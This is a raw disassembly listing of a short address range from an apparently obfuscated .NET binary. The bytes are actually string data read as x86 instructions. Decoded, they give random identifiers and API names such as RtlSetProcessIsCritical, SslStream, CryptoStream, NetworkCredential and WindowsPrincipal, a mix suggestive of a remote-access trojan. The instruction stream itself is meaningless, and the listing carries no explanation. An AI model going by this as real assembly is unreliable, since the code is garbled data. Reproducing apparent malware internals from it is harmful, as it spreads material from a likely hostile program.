  4089d6:	69 00 6b 51 71 4c    	imul   $0x4c71516b,(%eax),%eax
  4089dc:	75 51                	jne    0x408a2f
  4089de:	62 67 75             	bound  %esp,0x75(%edi)
  4089e1:	67 4f                	addr16 dec %edi
  4089e3:	78 52                	js     0x408a37
  4089e5:	74 56                	je     0x408a3d
  4089e7:	69 00 4c 45 50 68    	imul   $0x6850454c,(%eax),%eax
  4089ed:	57                   	push   %edi
  4089ee:	56                   	push   %esi
  4089ef:	78 7a                	js     0x408a6b
  4089f1:	52                   	push   %edx
  4089f2:	6a 6a                	push   $0x6a
  4089f4:	58                   	pop    %eax
  4089f5:	62 59 69             	bound  %ebx,0x69(%ecx)
  4089f8:	00 41 67             	add    %al,0x67(%ecx)
  4089fb:	6b 70 59 4c          	imul   $0x4c,0x59(%eax),%esi
  4089ff:	6c                   	insb   (%dx),%es:(%edi)
  408a00:	4f                   	dec    %edi
  408a01:	6f                   	outsl  %ds:(%esi),(%dx)
  408a02:	67 69 00 55 72 69 00 	imul   $0x697255,(%bx,%si),%eax
  408a09:	58                   	pop    %eax
  408a0a:	4a                   	dec    %edx
  408a0b:	50                   	push   %eax
  408a0c:	59                   	pop    %ecx
  408a0d:	74 57                	je     0x408a66
  408a0f:	68 46 77 69 00       	push   $0x697746
  408a14:	58                   	pop    %eax
  408a15:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a17:	66 42                	inc    %dx
  408a19:	49                   	dec    %ecx
  408a1a:	71 4e                	jno    0x408a6a
  408a1c:	65 47                	gs inc %edi
  408a1e:	78 58                	js     0x408a78
  408a20:	78 69                	js     0x408a8b
  408a22:	00 53 6a             	add    %dl,0x6a(%ebx)
  408a25:	66 55                	push   %bp
  408a27:	5a                   	pop    %edx
  408a28:	4b                   	dec    %ebx
  408a29:	6a 71                	push   $0x71
  408a2b:	66 61                	popaw
  408a2d:	59                   	pop    %ecx
  408a2e:	4c                   	dec    %esp
  408a2f:	7a 69                	jp     0x408a9a
  408a31:	00 79 6f             	add    %bh,0x6f(%ecx)
  408a34:	6a 75                	push   $0x75
  408a36:	5a                   	pop    %edx
  408a37:	4b                   	dec    %ebx
  408a38:	66 70 46             	data16 jo 0x408a81
  408a3b:	63 6a 00             	arpl   %ebp,0x0(%edx)
  408a3e:	44                   	inc    %esp
  408a3f:	4f                   	dec    %edi
  408a40:	72 46                	jb     0x408a88
  408a42:	4a                   	dec    %edx
  408a43:	4a                   	dec    %edx
  408a44:	51                   	push   %ecx
  408a45:	69 67 66 4c 78 49 5a 	imul   $0x5a49784c,0x66(%edi),%esp
  408a4c:	67 6c                	insb   (%dx),%es:(%di)
  408a4e:	6a 00                	push   $0x0
  408a50:	43                   	inc    %ebx
  408a51:	75 74                	jne    0x408ac7
  408a53:	61                   	popa
  408a54:	4c                   	dec    %esp
  408a55:	6d                   	insl   (%dx),%es:(%edi)
  408a56:	49                   	dec    %ecx
  408a57:	47                   	inc    %edi
  408a58:	70 6e                	jo     0x408ac8
  408a5a:	6a 00                	push   $0x0
  408a5c:	4a                   	dec    %edx
  408a5d:	6d                   	insl   (%dx),%es:(%edi)
  408a5e:	70 4e                	jo     0x408aae
  408a60:	59                   	pop    %ecx
  408a61:	70 6b                	jo     0x408ace
  408a63:	62 78 57             	bound  %edi,0x57(%eax)
  408a66:	71 6a                	jno    0x408ad2
  408a68:	00 79 4c             	add    %bh,0x4c(%ecx)
  408a6b:	6b 6e 57 49          	imul   $0x49,0x57(%esi),%ebp
  408a6f:	4f                   	dec    %edi
  408a70:	6f                   	outsl  %ds:(%esi),(%dx)
  408a71:	6a 52                	push   $0x52
  408a73:	45                   	inc    %ebp
  408a74:	6b 00 66             	imul   $0x66,(%eax),%eax
  408a77:	78 67                	js     0x408ae0
  408a79:	74 5a                	je     0x408ad5
  408a7b:	4a                   	dec    %edx
  408a7c:	6b 67 42 50          	imul   $0x50,0x42(%edi),%esp
  408a80:	42                   	inc    %edx
  408a81:	58                   	pop    %eax
  408a82:	6b 00 41             	imul   $0x41,(%eax),%eax
  408a85:	73 79                	jae    0x408b00
  408a87:	6e                   	outsb  %ds:(%esi),(%dx)
  408a88:	63 43 61             	arpl   %eax,0x61(%ebx)
  408a8b:	6c                   	insb   (%dx),%es:(%edi)
  408a8c:	6c                   	insb   (%dx),%es:(%edi)
  408a8d:	62 61 63             	bound  %esp,0x63(%ecx)
  408a90:	6b 00 52             	imul   $0x52,(%eax),%eax
  408a93:	65 6d                	gs insl (%dx),%es:(%edi)
  408a95:	6f                   	outsl  %ds:(%esi),(%dx)
  408a96:	74 65                	je     0x408afd
  408a98:	43                   	inc    %ebx
  408a99:	65 72 74             	gs jb  0x408b10
  408a9c:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408aa3:	56                   	push   %esi
  408aa4:	61                   	popa
  408aa5:	6c                   	insb   (%dx),%es:(%edi)
  408aa6:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  408aad:	43 
  408aae:	61                   	popa
  408aaf:	6c                   	insb   (%dx),%es:(%edi)
  408ab0:	6c                   	insb   (%dx),%es:(%edi)
  408ab1:	62 61 63             	bound  %esp,0x63(%ecx)
  408ab4:	6b 00 54             	imul   $0x54,(%eax),%eax
  408ab7:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  408abe:	6c                   	insb   (%dx),%es:(%edi)
  408abf:	62 61 63             	bound  %esp,0x63(%ecx)
  408ac2:	6b 00 52             	imul   $0x52,(%eax),%eax
  408ac5:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  408acc:	4b 65 
  408ace:	79 50                	jns    0x408b20
  408ad0:	65 72 6d             	gs jb  0x408b40
  408ad3:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  408ada:	68 65 63 6b 00       	push   $0x6b6365
  408adf:	46                   	inc    %esi
  408ae0:	6c                   	insb   (%dx),%es:(%edi)
  408ae1:	75 73                	jne    0x408b56
  408ae3:	68 46 69 6e 61       	push   $0x616e6946
  408ae8:	6c                   	insb   (%dx),%es:(%edi)
  408ae9:	42                   	inc    %edx
  408aea:	6c                   	insb   (%dx),%es:(%edi)
  408aeb:	6f                   	outsl  %ds:(%esi),(%dx)
  408aec:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408aef:	74 43                	je     0x408b34
  408af1:	51                   	push   %ecx
  408af2:	55                   	push   %ebp
  408af3:	77 52                	ja     0x408b47
  408af5:	62 44 75 44          	bound  %eax,0x44(%ebp,%esi,2)
  408af9:	6c                   	insb   (%dx),%es:(%edi)
  408afa:	55                   	push   %ebp
  408afb:	71 6b                	jno    0x408b68
  408afd:	00 77 72             	add    %dh,0x72(%edi)
  408b00:	56                   	push   %esi
  408b01:	56                   	push   %esi
  408b02:	68 65 4f 43 61       	push   $0x61434f65
  408b07:	73 6b                	jae    0x408b74
  408b09:	00 72 59             	add    %dh,0x59(%edx)
  408b0c:	46                   	inc    %esi
  408b0d:	72 53                	jb     0x408b62
  408b0f:	71 67                	jno    0x408b78
  408b11:	63 64 74 4b          	arpl   %esp,0x4b(%esp,%esi,2)
  408b15:	6c                   	insb   (%dx),%es:(%edi)
  408b16:	00 74 71 78          	add    %dh,0x78(%ecx,%esi,2)
  408b1a:	46                   	inc    %esi
  408b1b:	76 58                	jbe    0x408b75
  408b1d:	4e                   	dec    %esi
  408b1e:	6f                   	outsl  %ds:(%esi),(%dx)
  408b1f:	71 43                	jno    0x408b64
  408b21:	56                   	push   %esi
  408b22:	79 4c                	jns    0x408b70
  408b24:	6c                   	insb   (%dx),%es:(%edi)
  408b25:	00 7a 61             	add    %bh,0x61(%edx)
  408b28:	75 43                	jne    0x408b6d
  408b2a:	52                   	push   %edx
  408b2b:	72 46                	jb     0x408b73
  408b2d:	71 58                	jno    0x408b87
  408b2f:	4a                   	dec    %edx
  408b30:	76 50                	jbe    0x408b82
  408b32:	6c                   	insb   (%dx),%es:(%edi)
  408b33:	00 6d 73             	add    %ch,0x73(%ebp)
  408b36:	5a                   	pop    %edx
  408b37:	75 53                	jne    0x408b8c
  408b39:	48                   	dec    %eax
  408b3a:	47                   	inc    %edi
  408b3b:	4b                   	dec    %ebx
  408b3c:	52                   	push   %edx
  408b3d:	42                   	inc    %edx
  408b3e:	66 61                	popaw
  408b40:	55                   	push   %ebp
  408b41:	6c                   	insb   (%dx),%es:(%edi)
  408b42:	00 52 74             	add    %dl,0x74(%edx)
  408b45:	6c                   	insb   (%dx),%es:(%edi)
  408b46:	53                   	push   %ebx
  408b47:	65 74 50             	gs je  0x408b9a
  408b4a:	72 6f                	jb     0x408bbb
  408b4c:	63 65 73             	arpl   %esp,0x73(%ebp)
  408b4f:	73 49                	jae    0x408b9a
  408b51:	73 43                	jae    0x408b96
  408b53:	72 69                	jb     0x408bbe
  408b55:	74 69                	je     0x408bc0
  408b57:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  408b5a:	00 4e 65             	add    %cl,0x65(%esi)
  408b5d:	74 77                	je     0x408bd6
  408b5f:	6f                   	outsl  %ds:(%esi),(%dx)
  408b60:	72 6b                	jb     0x408bcd
  408b62:	43                   	inc    %ebx
  408b63:	72 65                	jb     0x408bca
  408b65:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408b68:	74 69                	je     0x408bd3
  408b6a:	61                   	popa
  408b6b:	6c                   	insb   (%dx),%es:(%edi)
  408b6c:	00 53 79             	add    %dl,0x79(%ebx)
  408b6f:	73 74                	jae    0x408be5
  408b71:	65 6d                	gs insl (%dx),%es:(%edi)
  408b73:	2e 53                	cs push %ebx
  408b75:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408b79:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  408b80:	6e 
  408b81:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408b84:	61                   	popa
  408b85:	6c                   	insb   (%dx),%es:(%edi)
  408b86:	00 57 69             	add    %dl,0x69(%edi)
  408b89:	6e                   	outsb  %ds:(%esi),(%dx)
  408b8a:	64 6f                	outsl  %fs:(%esi),(%dx)
  408b8c:	77 73                	ja     0x408c01
  408b8e:	50                   	push   %eax
  408b8f:	72 69                	jb     0x408bfa
  408b91:	6e                   	outsb  %ds:(%esi),(%dx)
  408b92:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408b95:	61                   	popa
  408b96:	6c                   	insb   (%dx),%es:(%edi)
  408b97:	00 67 65             	add    %ah,0x65(%edi)
  408b9a:	74 5f                	je     0x408bfb
  408b9c:	49                   	dec    %ecx
  408b9d:	6e                   	outsb  %ds:(%esi),(%dx)
  408b9e:	74 65                	je     0x408c05
  408ba0:	72 76                	jb     0x408c18
  408ba2:	61                   	popa
  408ba3:	6c                   	insb   (%dx),%es:(%edi)
  408ba4:	00 73 65             	add    %dh,0x65(%ebx)
  408ba7:	74 5f                	je     0x408c08
  408ba9:	49                   	dec    %ecx
  408baa:	6e                   	outsb  %ds:(%esi),(%dx)
  408bab:	74 65                	je     0x408c12
  408bad:	72 76                	jb     0x408c25
  408baf:	61                   	popa
  408bb0:	6c                   	insb   (%dx),%es:(%edi)
  408bb1:	00 42 4a             	add    %al,0x4a(%edx)
  408bb4:	65 4b                	gs dec %ebx
  408bb6:	56                   	push   %esi
  408bb7:	50                   	push   %eax
  408bb8:	66 52                	push   %dx
  408bba:	65 75 5a             	gs jne 0x408c17
  408bbd:	65 6c                	gs insb (%dx),%es:(%edi)
  408bbf:	00 47 6a             	add    %al,0x6a(%edi)
  408bc2:	6f                   	outsl  %ds:(%esi),(%dx)
  408bc3:	68 58 62 66 48       	push   $0x48666258
  408bc8:	55                   	push   %ebp
  408bc9:	69 6c 00 69 72 51 50 	imul   $0x41505172,0x69(%eax,%eax,1),%ebp
  408bd0:	41 
  408bd1:	78 45                	js     0x408c18
  408bd3:	73 51                	jae    0x408c26
  408bd5:	57                   	push   %edi
  408bd6:	69 6c 00 6b 65 72 6e 	imul   $0x656e7265,0x6b(%eax,%eax,1),%ebp
  408bdd:	65 
  408bde:	6c                   	insb   (%dx),%es:(%edi)
  408bdf:	33 32                	xor    (%edx),%esi
  408be1:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408be4:	6c                   	insb   (%dx),%es:(%edi)
  408be5:	00 6e 74             	add    %ch,0x74(%esi)
  408be8:	64 6c                	fs insb (%dx),%es:(%edi)
  408bea:	6c                   	insb   (%dx),%es:(%edi)
  408beb:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408bee:	6c                   	insb   (%dx),%es:(%edi)
  408bef:	00 4b 69             	add    %cl,0x69(%ebx)
  408bf2:	6c                   	insb   (%dx),%es:(%edi)
  408bf3:	6c                   	insb   (%dx),%es:(%edi)
  408bf4:	00 50 6f             	add    %dl,0x6f(%eax)
  408bf7:	6c                   	insb   (%dx),%es:(%edi)
  408bf8:	6c                   	insb   (%dx),%es:(%edi)
  408bf9:	00 4c 42 79          	add    %cl,0x79(%edx,%eax,2)
  408bfd:	71 76                	jno    0x408c75
  408bff:	54                   	push   %esp
  408c00:	44                   	inc    %esp
  408c01:	58                   	pop    %eax
  408c02:	52                   	push   %edx
  408c03:	6f                   	outsl  %ds:(%esi),(%dx)
  408c04:	42                   	inc    %edx
  408c05:	6d                   	insl   (%dx),%es:(%edi)
  408c06:	00 48 49             	add    %cl,0x49(%eax)
  408c09:	6c                   	insb   (%dx),%es:(%edi)
  408c0a:	46                   	inc    %esi
  408c0b:	49                   	dec    %ecx
  408c0c:	6e                   	outsb  %ds:(%esi),(%dx)
  408c0d:	41                   	inc    %ecx
  408c0e:	77 50                	ja     0x408c60
  408c10:	4a                   	dec    %edx
  408c11:	77 50                	ja     0x408c63
  408c13:	47                   	inc    %edi
  408c14:	6d                   	insl   (%dx),%es:(%edi)
  408c15:	00 74 68 75          	add    %dh,0x75(%eax,%ebp,2)
  408c19:	44                   	inc    %esp
  408c1a:	4a                   	dec    %edx
  408c1b:	4a                   	dec    %edx
  408c1c:	4d                   	dec    %ebp
  408c1d:	6e                   	outsb  %ds:(%esi),(%dx)
  408c1e:	69 41 49 6d 00 6d 4d 	imul   $0x4d6d006d,0x49(%ecx),%eax
  408c25:	55                   	push   %ebp
  408c26:	41                   	inc    %ecx
  408c27:	4b                   	dec    %ebx
  408c28:	61                   	popa
  408c29:	67 52                	addr16 push %edx
  408c2b:	4c                   	dec    %esp
  408c2c:	6c                   	insb   (%dx),%es:(%edi)
  408c2d:	68 48 4d 6d 00       	push   $0x6d4d48
  408c32:	7a 6c                	jp     0x408ca0
  408c34:	62 49 47             	bound  %ecx,0x47(%ecx)
  408c37:	73 42                	jae    0x408c7b
  408c39:	68 4c 6c 79 4e       	push   $0x4e796c4c
  408c3e:	6d                   	insl   (%dx),%es:(%edi)
  408c3f:	00 7a 73             	add    %bh,0x73(%edx)
  408c42:	43                   	inc    %ebx
  408c43:	6c                   	insb   (%dx),%es:(%edi)
  408c44:	66 58                	pop    %ax
  408c46:	75 75                	jne    0x408cbd
  408c48:	59                   	pop    %ecx
  408c49:	6e                   	outsb  %ds:(%esi),(%dx)
  408c4a:	4a                   	dec    %edx
  408c4b:	56                   	push   %esi
  408c4c:	6d                   	insl   (%dx),%es:(%edi)
  408c4d:	00 46 69             	add    %al,0x69(%esi)
  408c50:	6c                   	insb   (%dx),%es:(%edi)
  408c51:	65 53                	gs push %ebx
  408c53:	74 72                	je     0x408cc7
  408c55:	65 61                	gs popa
  408c57:	6d                   	insl   (%dx),%es:(%edi)
  408c58:	00 4e 65             	add    %cl,0x65(%esi)
  408c5b:	74 77                	je     0x408cd4
  408c5d:	6f                   	outsl  %ds:(%esi),(%dx)
  408c5e:	72 6b                	jb     0x408ccb
  408c60:	53                   	push   %ebx
  408c61:	74 72                	je     0x408cd5
  408c63:	65 61                	gs popa
  408c65:	6d                   	insl   (%dx),%es:(%edi)
  408c66:	00 53 73             	add    %dl,0x73(%ebx)
  408c69:	6c                   	insb   (%dx),%es:(%edi)
  408c6a:	53                   	push   %ebx
  408c6b:	74 72                	je     0x408cdf
  408c6d:	65 61                	gs popa
  408c6f:	6d                   	insl   (%dx),%es:(%edi)
  408c70:	00 43 72             	add    %al,0x72(%ebx)
  408c73:	79 70                	jns    0x408ce5
  408c75:	74 6f                	je     0x408ce6
  408c77:	53                   	push   %ebx
  408c78:	74 72                	je     0x408cec
  408c7a:	65 61                	gs popa
  408c7c:	6d                   	insl   (%dx),%es:(%edi)
  408c7d:	00 47 5a             	add    %al,0x5a(%edi)
  408c80:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  408c87:	6d                   	insl   (%dx),%es:(%edi)
  408c88:	00 4d 65             	add    %cl,0x65(%ebp)
  408c8b:	6d                   	insl   (%dx),%es:(%edi)
  408c8c:	6f                   	outsl  %ds:(%esi),(%dx)
  408c8d:	72 79                	jb     0x408d08
  408c8f:	53                   	push   %ebx
  408c90:	74 72                	je     0x408d04
  408c92:	65 61                	gs popa
  408c94:	6d                   	insl   (%dx),%es:(%edi)
  408c95:	00 67 65             	add    %ah,0x65(%edi)
  408c98:	74 5f                	je     0x408cf9
  408c9a:	49                   	dec    %ecx
  408c9b:	74 65                	je     0x408d02
  408c9d:	6d                   	insl   (%dx),%es:(%edi)
  408c9e:	00 67 65             	add    %ah,0x65(%edi)
  408ca1:	74 5f                	je     0x408d02
  408ca3:	49                   	dec    %ecx
  408ca4:	73 36                	jae    0x408cdc
  408ca6:	34 42                	xor    $0x42,%al
  408ca8:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  408caf:	74 
  408cb0:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  408cb7:	65 6d                	gs insl (%dx),%es:(%edi)
  408cb9:	00 51 79             	add    %dl,0x79(%ecx)
  408cbc:	75 59                	jne    0x408d17
  408cbe:	4d                   	dec    %ebp
  408cbf:	68 69 58 74 45       	push   $0x45745869
  408cc4:	45                   	inc    %ebp
  408cc5:	66 6d                	insw   (%dx),%es:(%edi)
  408cc7:	00 53 79             	add    %dl,0x79(%ebx)
  408cca:	6d                   	insl   (%dx),%es:(%edi)
  408ccb:	6d                   	insl   (%dx),%es:(%edi)
  408ccc:	65 74 72             	gs je  0x408d41
  408ccf:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408cd6:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  408cdd:	79 
  408cde:	6d                   	insl   (%dx),%es:(%edi)
  408cdf:	6d                   	insl   (%dx),%es:(%edi)
  408ce0:	65 74 72             	gs je  0x408d55
  408ce3:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408cea:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  408cf1:	73 
  408cf2:	68 41 6c 67 6f       	push   $0x6f676c41
  408cf7:	72 69                	jb     0x408d62
  408cf9:	74 68                	je     0x408d63
  408cfb:	6d                   	insl   (%dx),%es:(%edi)
  408cfc:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  408d00:	6d                   	insl   (%dx),%es:(%edi)
  408d01:	00 52 61             	add    %dl,0x61(%edx)
  408d04:	6e                   	outsb  %ds:(%esi),(%dx)
  408d05:	64 6f                	outsl  %fs:(%esi),(%dx)
  408d07:	6d                   	insl   (%dx),%es:(%edi)
  408d08:	00 49 43             	add    %cl,0x43(%ecx)
  408d0b:	72 79                	jb     0x408d86
  408d0d:	70 74                	jo     0x408d83
  408d0f:	6f                   	outsl  %ds:(%esi),(%dx)
  408d10:	54                   	push   %esp
  408d11:	72 61                	jb     0x408d74
  408d13:	6e                   	outsb  %ds:(%esi),(%dx)
  408d14:	73 66                	jae    0x408d7c
  408d16:	6f                   	outsl  %ds:(%esi),(%dx)
  408d17:	72 6d                	jb     0x408d86
  408d19:	00 45 6e             	add    %al,0x6e(%ebp)
  408d1c:	75 6d                	jne    0x408d8b
  408d1e:	00 66 69             	add    %ah,0x69(%esi)
  408d21:	52                   	push   %edx
  408d22:	6f                   	outsl  %ds:(%esi),(%dx)
  408d23:	59                   	pop    %ecx
  408d24:	6e                   	outsb  %ds:(%esi),(%dx)
  408d25:	71 41                	jno    0x408d68
  408d27:	79 6d                	jns    0x408d96
  408d29:	00 5a 50             	add    %bl,0x50(%edx)
  408d2c:	54                   	push   %esp
  408d2d:	75 43                	jne    0x408d72
  408d2f:	58                   	pop    %eax
  408d30:	4a                   	dec    %edx
  408d31:	42                   	inc    %edx
  408d32:	47                   	inc    %edi
  408d33:	63 41 55             	arpl   %eax,0x55(%ecx)
  408d36:	44                   	inc    %esp
  408d37:	6e                   	outsb  %ds:(%esi),(%dx)
  408d38:	00 69 6e             	add    %ch,0x6e(%ecx)
  408d3b:	6b 43 41 43          	imul   $0x43,0x41(%ebx),%eax
  408d3f:	6c                   	insb   (%dx),%es:(%edi)
  408d40:	75 5a                	jne    0x408d9c
  408d42:	4b                   	dec    %ebx
  408d43:	6e                   	outsb  %ds:(%esi),(%dx)
  408d44:	00 52 48             	add    %dl,0x48(%edx)
  408d47:	70 6c                	jo     0x408db5
  408d49:	56                   	push   %esi
  408d4a:	59                   	pop    %ecx
  408d4b:	6b 43 62 6b          	imul   $0x6b,0x62(%ebx),%eax
  408d4f:	4e                   	dec    %esi
  408d50:	6e                   	outsb  %ds:(%esi),(%dx)
  408d51:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  408d55:	6f                   	outsl  %ds:(%esi),(%dx)
  408d56:	6f                   	outsl  %ds:(%esi),(%dx)
  408d57:	6c                   	insb   (%dx),%es:(%edi)
  408d58:	65 61                	gs popa
  408d5a:	6e                   	outsb  %ds:(%esi),(%dx)
  408d5b:	00 4b 70             	add    %cl,0x70(%ebx)
  408d5e:	54                   	push   %esp
  408d5f:	6e                   	outsb  %ds:(%esi),(%dx)
  408d60:	41                   	inc    %ecx
  408d61:	79 51                	jns    0x408db4
  408d63:	4e                   	dec    %esi
  408d64:	58                   	pop    %eax
  408d65:	4d                   	dec    %ebp
  408d66:	57                   	push   %edi
  408d67:	64 6e                	outsb  %fs:(%esi),(%dx)
  408d69:	00 4d 61             	add    %cl,0x61(%ebp)
  408d6c:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  408d73:	43                   	inc    %ebx
  408d74:	68 61 69 6e 00       	push   $0x6e6961
  408d79:	41                   	inc    %ecx
  408d7a:	70 70                	jo     0x408dec
  408d7c:	44                   	inc    %esp
  408d7d:	6f                   	outsl  %ds:(%esi),(%dx)
  408d7e:	6d                   	insl   (%dx),%es:(%edi)
  408d7f:	61                   	popa
  408d80:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  408d87:	43                   	inc    %ebx
  408d88:	75 72                	jne    0x408dfc
  408d8a:	72 65                	jb     0x408df1
  408d8c:	6e                   	outsb  %ds:(%esi),(%dx)
  408d8d:	74 44                	je     0x408dd3
  408d8f:	6f                   	outsl  %ds:(%esi),(%dx)
  408d90:	6d                   	insl   (%dx),%es:(%edi)
  408d91:	61                   	popa
  408d92:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  408d99:	00 47 65             	add    %al,0x65(%edi)
  408d9c:	74 46                	je     0x408de4
  408d9e:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  408da5:	57 
  408da6:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  408dad:	78 
  408dae:	74 65                	je     0x408e15
  408db0:	6e                   	outsb  %ds:(%esi),(%dx)
  408db1:	73 69                	jae    0x408e1c
  408db3:	6f                   	outsl  %ds:(%esi),(%dx)
  408db4:	6e                   	outsb  %ds:(%esi),(%dx)
  408db5:	00 67 65             	add    %ah,0x65(%edi)
  408db8:	74 5f                	je     0x408e19
  408dba:	4f                   	dec    %edi
  408dbb:	53                   	push   %ebx
  408dbc:	56                   	push   %esi
  408dbd:	65 72 73             	gs jb  0x408e33
  408dc0:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  408dc7:	74 65                	je     0x408e2e
  408dc9:	6d                   	insl   (%dx),%es:(%edi)
  408dca:	2e 49                	cs dec %ecx
  408dcc:	4f                   	dec    %edi
  408dcd:	2e 43                	cs inc %ebx
  408dcf:	6f                   	outsl  %ds:(%esi),(%dx)
  408dd0:	6d                   	insl   (%dx),%es:(%edi)
  408dd1:	70 72                	jo     0x408e45
  408dd3:	65 73 73             	gs jae 0x408e49
  408dd6:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  408ddd:	6c                   	insb   (%dx),%es:(%edi)
  408dde:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  408de5:	00 53 79             	add    %dl,0x79(%ebx)
  408de8:	73 74                	jae    0x408e5e
  408dea:	65 6d                	gs insl (%dx),%es:(%edi)
  408dec:	2e 53                	cs push %ebx
  408dee:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408df2:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  408df9:	68 
  408dfa:	65 6e                	outsb  %gs:(%esi),(%dx)
  408dfc:	74 69                	je     0x408e67
  408dfe:	63 61 74             	arpl   %esp,0x74(%ecx)
  408e01:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  408e08:	74 65                	je     0x408e6f
  408e0a:	6d                   	insl   (%dx),%es:(%edi)
  408e0b:	2e 52                	cs push %edx
  408e0d:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  408e10:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408e15:	6e                   	outsb  %ds:(%esi),(%dx)
  408e16:	00 58 35             	add    %bl,0x35(%eax)
  408e19:	30 39                	xor    %bh,(%ecx)
  408e1b:	43                   	inc    %ebx
  408e1c:	65 72 74             	gs jb  0x408e93
  408e1f:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408e26:	43                   	inc    %ebx
  408e27:	6f                   	outsl  %ds:(%esi),(%dx)
  408e28:	6c                   	insb   (%dx),%es:(%edi)
  408e29:	6c                   	insb   (%dx),%es:(%edi)
  408e2a:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408e2f:	6e                   	outsb  %ds:(%esi),(%dx)
  408e30:	00 4d 61             	add    %cl,0x61(%ebp)
  408e33:	6e                   	outsb  %ds:(%esi),(%dx)
  408e34:	61                   	popa
  408e35:	67 65 6d             	gs insl (%dx),%es:(%di)
  408e38:	65 6e                	outsb  %gs:(%esi),(%dx)
  408e3a:	74 4f                	je     0x408e8b
  408e3c:	62 6a 65             	bound  %ebp,0x65(%edx)
  408e3f:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  408e43:	6c                   	insb   (%dx),%es:(%edi)
  408e44:	6c                   	insb   (%dx),%es:(%edi)
  408e45:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408e4a:	6e                   	outsb  %ds:(%esi),(%dx)
  408e4b:	00 73 65             	add    %dh,0x65(%ebx)
  408e4e:	74 5f                	je     0x408eaf
  408e50:	50                   	push   %eax
  408e51:	6f                   	outsl  %ds:(%esi),(%dx)
  408e52:	73 69                	jae    0x408ebd
  408e54:	74 69                	je     0x408ebf
  408e56:	6f                   	outsl  %ds:(%esi),(%dx)
  408e57:	6e                   	outsb  %ds:(%esi),(%dx)
  408e58:	00 43 72             	add    %al,0x72(%ebx)
  408e5b:	79 70                	jns    0x408ecd
  408e5d:	74 6f                	je     0x408ece
  408e5f:	67 72 61             	addr16 jb 0x408ec3
  408e62:	70 68                	jo     0x408ecc
  408e64:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  408e6b:	74 69                	je     0x408ed6
  408e6d:	6f                   	outsl  %ds:(%esi),(%dx)
  408e6e:	6e                   	outsb  %ds:(%esi),(%dx)
  408e6f:	00 41 72             	add    %al,0x72(%ecx)
  408e72:	67 75 6d             	addr16 jne 0x408ee2
  408e75:	65 6e                	outsb  %gs:(%esi),(%dx)
  408e77:	74 4e                	je     0x408ec7
  408e79:	75 6c                	jne    0x408ee7
  408e7b:	6c                   	insb   (%dx),%es:(%edi)
  408e7c:	45                   	inc    %ebp
  408e7d:	78 63                	js     0x408ee2
  408e7f:	65 70 74             	gs jo  0x408ef6
  408e82:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  408e89:	75 6d                	jne    0x408ef8
  408e8b:	65 6e                	outsb  %gs:(%esi),(%dx)
  408e8d:	74 45                	je     0x408ed4
  408e8f:	78 63                	js     0x408ef4
  408e91:	65 70 74             	gs jo  0x408f08
  408e94:	69 6f 6e 00 4d 73 59 	imul   $0x59734d00,0x6e(%edi),%ebp
  408e9b:	55                   	push   %ebp
  408e9c:	6a 61                	push   $0x61
  408e9e:	68 65 76 46 51       	push   $0x51467665
  408ea3:	77 6e                	ja     0x408f13
  408ea5:	00 62 50             	add    %ah,0x50(%edx)
  408ea8:	68 59 76 49 42       	push   $0x42497659
  408ead:	47                   	inc    %edi
  408eae:	71 64                	jno    0x408f14
  408eb0:	64 78 6e             	fs js  0x408f21
  408eb3:	00 72 6d             	add    %dh,0x6d(%edx)
  408eb6:	4f                   	dec    %edi
  408eb7:	56                   	push   %esi
